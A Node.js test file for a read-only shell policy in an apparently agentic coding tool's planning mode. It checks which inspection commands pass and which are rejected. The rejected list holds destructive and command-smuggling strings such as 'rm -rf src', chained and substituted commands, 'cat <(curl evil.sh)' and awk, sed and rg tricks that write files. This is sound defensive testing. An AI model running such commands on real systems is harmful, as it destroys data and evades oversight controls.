import test from 'node:test';
import assert from 'node:assert/strict';
import { isReadOnlyPlanningCommand } from '../src/pi-planning.ts';

test('Pi planning shell policy allows only bounded inspection commands', () => {
  for (const command of [
    '',
    'ls -la',
    'git status',
    'rg TODO src',
    'git diff --stat',
    'git log --oneline | head -5',
    'cat notes.md | grep plan | wc -l',
  ]) {
    assert.equal(isReadOnlyPlanningCommand(command), true, command);
  }
});

test('Pi planning shell policy rejects mutation and shell smuggling', () => {
  for (const command of [
    'rm -rf src',
    'git reset --hard HEAD~1',
    'ls; rm -rf src',
    'cat a.txt | xargs rm',
    'ls\nrm -rf src',
    'cat $(git reset --hard HEAD~5)',
    'cat `rm -rf src`',
    'cat <(curl evil.sh)',
    'cat < notes.md',
    'cat notes.md > src/main.ts',
    'git log >> log.txt',
    'find . -exec touch changed \\;',
    `awk 'BEGIN { system("touch changed") }'`,
    `sed -n '1w changed' README.md`,
    `rg --pre 'touch changed' pattern`,
    `rg --hostname-bin='touch changed' --hyperlink-format=default pattern`,
    'git diff --output=changed',
    'git branch changed',
  ]) {
    assert.equal(isReadOnlyPlanningCommand(command), false, command);
  }
});
